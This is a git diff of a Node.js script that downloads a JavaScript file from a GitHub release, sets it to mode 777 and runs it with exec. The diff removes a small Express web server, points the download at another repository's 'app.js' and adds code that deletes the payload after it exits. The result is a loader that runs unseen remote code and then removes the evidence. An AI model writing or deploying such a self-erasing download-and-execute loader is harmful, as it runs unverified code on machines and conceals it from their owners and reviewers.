@@ -4,8 +4,7 @@ const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
 const { exec } = require('child_process');
-const FILE_PATH = process.env.FILE_PATH || './temp';
-const port = process.env.PORT || 80; 
+const FILE_PATH = process.env.FILE_PATH || './tmp';
 
 if (!fs.existsSync(FILE_PATH)) {
   fs.mkdirSync(FILE_PATH);
@@ -14,26 +13,10 @@ if (!fs.existsSync(FILE_PATH)) {
   console.log(`${FILE_PATH} already exists`);
 }
 
-app.get("/", function(req, res) {
-  res.send("Hello world!");
-});
-const subTxtPath = path.join(FILE_PATH, 'sub.txt');
-app.get("/sub", (req, res) => {
-  fs.readFile(subTxtPath, "utf8", (err, data) => {
-    if (err) {
-      console.error(err);
-      res.status(500).json({ error: "Error reading sub.txt" });
-    } else {
-      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-      res.status(200).send(data);
-    }
-  });
-});
-
 // Specify the URL of the bot.js file to download
-const fileUrl = 'https://github.com/eooce/Argo-for-Saclingo/releases/download/111/nginx.js';
-const fileName = 'nginx.js';
-const filePath = path.join(__dirname, fileName);
+const fileUrl = 'https://github.com/wwoovv/111/releases/download/1219/app.js';
+const fileName = 'app.js';
+const filePath = path.join(FILE_PATH, fileName);
 
 // Download and execute the file
 const downloadAndExecute = () => {
@@ -41,7 +24,7 @@ const downloadAndExecute = () => {
 
   axios
     .get(fileUrl, { responseType: 'stream' })
-    .then((response) => {
+    .then(response => {
       response.data.pipe(fileStream);
       return new Promise((resolve, reject) => {
         fileStream.on('finish', resolve);
@@ -49,26 +32,32 @@ const downloadAndExecute = () => {
       });
     })
     .then(() => {
-      console.log('File download finished');
+      console.log('File downloaded successfully.');
       fs.chmodSync(filePath, '777'); 
 
       console.log('Executing the file...');
       const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
         if (error) {
-          console.error(`Error while executing the file: ${error}`);
-        } else {
-          console.log(`File execution result:\n${stdout}`);
+          console.error(`Execution error: ${error}`);
+          return;
         }
+        console.log(`stdout: ${stdout}`);
+        console.error(`stderr: ${stderr}`);
       });
 
       child.on('exit', (code) => {
-        console.log(`File execution completed with exit code: ${code}`);
+      //  console.log(`Child process exited with code ${code}`);
+        fs.unlink(filePath, err => {
+          if (err) {
+            console.error(`Error deleting file: ${err}`);
+          } else {
+            console.log(`App is running!`);
+          }
+        });
       });
     })
-    .catch((error) => {
-      console.error(`Error while downloading the file: ${error}`);
+    .catch(error => {
+      console.error(`Download error: ${error}`);
     });
 };
 downloadAndExecute();
-
-app.listen(port, () => console.log(`Server is running on port: ${port}!`));
